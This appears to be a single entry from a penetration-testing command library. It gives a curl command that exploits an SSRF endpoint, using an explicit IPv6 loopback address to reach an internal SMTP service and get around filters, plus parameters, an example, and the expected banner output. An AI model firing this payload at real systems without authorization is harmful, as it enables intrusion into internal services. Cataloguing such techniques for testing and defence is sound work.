---
type: command
executor: bash
data: 'curl "http://$_TARGET_APP/ssrf?url=http://[0000::1]:25/"'
output: null
platforms:
  - Web
tags:
  - ssrf
  - ipv6
  - smtp
verified: true
validated: true
---

# access-internal-smtp-via-ssrf-ipv6-loopback

## Command

```bash
curl "http://$_TARGET_APP/ssrf?url=http://[0000::1]:25/"
```

## Description

Access internal SMTP via explicit IPv6 loopback SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_APP | Vulnerable app URL | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/ssrf?url=http://[0000::1]:25/"
```

## Expected Output

SMTP banner or protocol response.

## Related

- [[procedures/Bypass-SSRF-Filters-with-IPv6-Loopback-Addresses]]
